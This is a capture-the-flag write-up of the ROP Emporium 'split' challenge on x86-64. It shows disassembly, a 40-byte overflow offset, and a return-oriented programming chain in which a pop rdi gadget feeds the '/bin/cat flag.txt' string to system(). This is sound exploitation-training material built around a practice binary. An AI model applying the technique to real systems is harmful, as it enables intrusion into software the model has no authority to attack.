## Solution

I did the x86-64 version of this challenge which is slightly different than the x86 version. This is beacause of the way parameters are passed into functions. In x86 the parameters are pushed onto the stack whereas in x64 they are passed through registers. This makes the x64 slightly more challegeing but not to much. The hardest part of this challenge was getting the exploit to work in C.

[Link to split challenge](https://ropemporium.com/challenge/split.html)

### Initial Recon

running rabin2 -I shows that the binary has NX enabled but has canaries turned off

```sh
arch     x86
baddr    0x400000
binsz    6805
bintype  elf
bits     64
canary   false
class    ELF64
compiler GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
nx       true
os       linux
pic      false
relocs   true
relro    partial
rpath    NONE
sanitize false
static   false
stripped false
subsys   linux
va       true
```

### Exploration

After opening the binary in rizin I looked through the functions: main, pwnme, and usefulFunction. There pictures are as follows

- afl command

```asm
0x004005b0    1 42           entry0
0x004005f0    4 42   -> 37   sym.deregister_tm_clones
0x00400620    4 58   -> 55   sym.register_tm_clones
0x00400660    3 34   -> 29   sym.__do_global_dtors_aux
0x00400690    1 7            entry.init0
0x004006e8    1 90           sym.pwnme
0x00400580    1 6            sym.imp.memset
0x00400550    1 6            sym.imp.puts
0x00400570    1 6            sym.imp.printf
0x00400590    1 6            sym.imp.read
0x00400742    1 17           sym.usefulFunction
0x00400560    1 6            sym.imp.system
0x004007d0    1 2            sym.__libc_csu_fini
0x004007d4    1 9            sym._fini
0x00400760    4 101          sym.__libc_csu_init
0x004005e0    1 2            sym._dl_relocate_static_pie
0x00400697    1 81           main
0x004005a0    1 6            sym.imp.setvbuf
0x00400528    3 23           sym._init
```

- main

```asm
┌ int main (int argc, char **argv, char **envp);
│           0x00400697      55             push rbp
│           0x00400698      4889e5         mov rbp, rsp
│           0x0040069b      488b05d60920.  mov rax, qword [obj.stdout] ; obj.__TMC_END__
│                                                                      ; [0x601078:8]=0
│           0x004006a2      b900000000     mov ecx, 0                  ; size_t size
│           0x004006a7      ba02000000     mov edx, 2                  ; int mode
│           0x004006ac      be00000000     mov esi, 0                  ; char *buf
│           0x004006b1      4889c7         mov rdi, rax                ; FILE*stream
│           0x004006b4      e8e7feffff     call sym.imp.setvbuf        ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
│           0x004006b9      bfe8074000     mov edi, str.split_by_ROP_Emporium ; 0x4007e8 ; "split by ROP Emporium" ; const char *s
│           0x004006be      e88dfeffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004006c3      bffe074000     mov edi, str.x86_64_n       ; 0x4007fe ; "x86_64\n" ; const char *s
│           0x004006c8      e883feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004006cd      b800000000     mov eax, 0
│           0x004006d2      e811000000     call sym.pwnme
│           0x004006d7      bf06084000     mov edi, str._nExiting      ; 0x400806 ; "\nExiting" ; const char *s
│           0x004006dc      e86ffeffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004006e1      b800000000     mov eax, 0
│           0x004006e6      5d             pop rbp
└           0x004006e7      c3             ret
```

- pwnme

```asm
┌ sym.pwnme ();
│           ; var void *buf @ rbp-0x20
│           0x004006e8      55             push rbp
│           0x004006e9      4889e5         mov rbp, rsp
│           0x004006ec      4883ec20       sub rsp, 0x20
│           0x004006f0      488d45e0       lea rax, [buf]
│           0x004006f4      ba20000000     mov edx, 0x20               ; 32 ; size_t n
│           0x004006f9      be00000000     mov esi, 0                  ; int c
│           0x004006fe      4889c7         mov rdi, rax                ; void *s
│           0x00400701      e87afeffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)
│           0x00400706      bf10084000     mov edi, str.Contriving_a_reason_to_ask_user_for_data... ; 0x400810 ; "Contriving a reason to ask user for data..." ; const char *s
│           0x0040070b      e840feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00400710      bf3c084000     mov edi, 0x40083c           ; const char *format
│           0x00400715      b800000000     mov eax, 0
│           0x0040071a      e851feffff     call sym.imp.printf         ; int printf(const char *format)
│           0x0040071f      488d45e0       lea rax, [buf]
│           0x00400723      ba60000000     mov edx, 0x60               ; '`' ; 96 ; size_t nbyte
│           0x00400728      4889c6         mov rsi, rax                ; void *buf
│           0x0040072b      bf00000000     mov edi, 0                  ; int fildes
│           0x00400730      e85bfeffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
│           0x00400735      bf3f084000     mov edi, str.Thank_you_     ; 0x40083f ; "Thank you!" ; const char *s
│           0x0040073a      e811feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x0040073f      90             nop
│           0x00400740      c9             leave
└           0x00400741      c3             ret
```

- usefulFunction

```asm
┌ sym.usefulFunction ();
│           0x00400742      55             push rbp
│           0x00400743      4889e5         mov rbp, rsp
│           0x00400746      bf4a084000     mov edi, str._bin_ls        ; 0x40084a ; "/bin/ls" ; const char *string
│           0x0040074b      e810feffff     call sym.imp.system         ; int system(const char *string)
│           0x00400750      90             nop
│           0x00400751      5d             pop rbp
└           0x00400752      c3             ret
```

After reading through the disassembly I saw that a buffer of 32 bytes was created. This is the exact same setup as the *ret2win* challenge. The only difference was that the read buffer this time was 96 bytes. This can be seen in the *pwnme()* function shown above. This leaves plenty of room for a ROP chain.

Calculating the offset was the exact same (40 bytes) as before since none of the values changed and the stack was the same. The difference is that this time we have to find addresses to build the ROP chain since the stack isn't executable and we cant't just write shellcode.

### Generating the Exploit

The goal is to get system to cat the *flag.txt*. Currently the only thing that system does is run ls. Running *ii* in r2/rizin shows us that the *'/bin/cat flag.txt'* is still there from the first challenge. So the chain will have to look something like this.

```sh
|=============|() ()|=====================|() ()|============================|
| Some Gadget |  &  | Address of /bin/cat |  &  | Address of call to system()|
|=============|() ()|=====================|() ()|============================|
```
*Bad representation of a chain

All that is left is to find the gadget that makes this all work. In x64 the parameters are passed to the function by use of registers. This means that we can call system with RDI populated with our */bin/cat* string and it should work the same as before. 

> RDI is usually the first register used to pass values into functions on x64. This can vary with different compilers.

This means that we need to find a gadget that allows us to load the address of the */bin/cat* string into rdi and then jump to *system()*. We can find this by using a tool like ROPgadget, ropper, or just use, /R in r2/rizin to find the gadget.

In this case I used,

```sh
/R pop rdi
```

This prints out the opcodes and the address of it. In this case the gadget is at *0x4007c3*. The virtual address of the */bin/cat flag.txt* string is *0x601060*. Finally, the virtual address to the call of system is in the *usefulFunction()* at *0x40074b*. 

This is what the gadget is doing for the exploit.

```asm
                            |____AAAAAAAA___|
                            |____AAAAAAAA___|
                            |____AAAAAAAA___|
                    RIP ->  |____/bin/cat___|  ; pop rdi loads the string's address into RDI
                            |__ret_system()_|           

                            |____AAAAAAAA___|
                            |____AAAAAAAA___|
                            |____AAAAAAAA___|
                            |__pop_/bin/cat_|
                    RIP ->  |__ret_system()_|  ; ret jumps to the address of the call to system()
```

> Technically the stack grows downwards from the return address on x86. It changes based on the architecture

So our chain will look something like, 

> pop rdi; ret -> */bin/cat flag.txt* -> *system()* -> close

### Writing the Exploit

I wrote my exploit in C so that I can get used to doing things the harder way first. Also python won't always be installed on a system.

The main one can be found in *exploit.c*. I had a lot of trouble getting to this to work. I made a python script to try and make sure my logic was right. Im including that also because It does abstract a lot of the details away. This one is the *exploit.py* script.

I tried to see if I could fix the seg fault at the end by seeing if their was some way to get the rop chain to redirect back into the execution flow that it left in *pwnme()*. I couldn't get this to work, so it is left in its current state.

### Flag

The flag prints out with this output from exploit.c

```sh
split by ROP Emporium
x86-64

Contriving a reason to ask user for data...
> Thank you!
ROPE{a_placeholder_32byte_flag!}
Segmentation fault
```